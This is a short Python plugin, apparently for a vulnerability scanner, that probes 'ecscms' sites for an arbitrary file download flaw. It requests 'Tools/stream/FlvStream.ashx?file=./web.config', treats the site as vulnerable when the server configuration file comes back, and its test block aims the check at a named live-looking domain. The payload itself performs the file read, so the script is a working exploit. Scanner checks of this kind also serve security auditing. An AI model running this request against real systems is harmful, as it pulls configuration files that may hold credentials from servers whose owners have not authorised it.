#!/usr/bin/env python
#-*- coding:utf-8 -*-
#Author:judger
#SerType: ECS arbitrary file download
def assign(service, arg):
	if service == 'ecscms':
		return True, arg

def audit(arg):
	payload = "Tools/stream/FlvStream.ashx?file=./web.config"
	url = arg + payload
	code, head, body, errcode, _url = curl.curl2(url)
	if code == 200 and 'configSection' in body:
		security_warning('Arbitrary file download:'+url)

if __name__ == '__main__':
	from dummy import *
	audit(assign('ecscms', 'http://www.jhyzh.com/')[1])